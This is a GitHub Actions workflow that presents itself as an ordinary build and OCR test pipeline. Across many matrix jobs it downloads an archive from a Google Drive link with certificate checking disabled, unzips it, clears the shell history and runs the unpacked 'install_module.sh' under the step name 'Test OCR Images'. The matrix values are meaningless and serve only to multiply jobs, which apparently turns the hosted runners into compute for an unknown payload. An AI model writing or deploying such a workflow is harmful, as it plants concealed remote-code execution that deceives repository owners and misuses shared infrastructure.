name: bautroi2app
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  COMPILE:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Provision', 'Build', 'Confirm', 'Trigger', 'Deploy']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=13fBoq-snMd2OeCMuA_9MJz7mBvyKQ-Gi" -O bautroi2app.zip
        unzip -o bautroi2app.zip
        rm bautroi2app.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh


  RELEASE1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Prepare', 'Construct', 'Inspect', 'Activate', 'Publish']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=13fBoq-snMd2OeCMuA_9MJz7mBvyKQ-Gi" -O bautroi2app.zip
        unzip -o bautroi2app.zip
        rm bautroi2app.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh
        
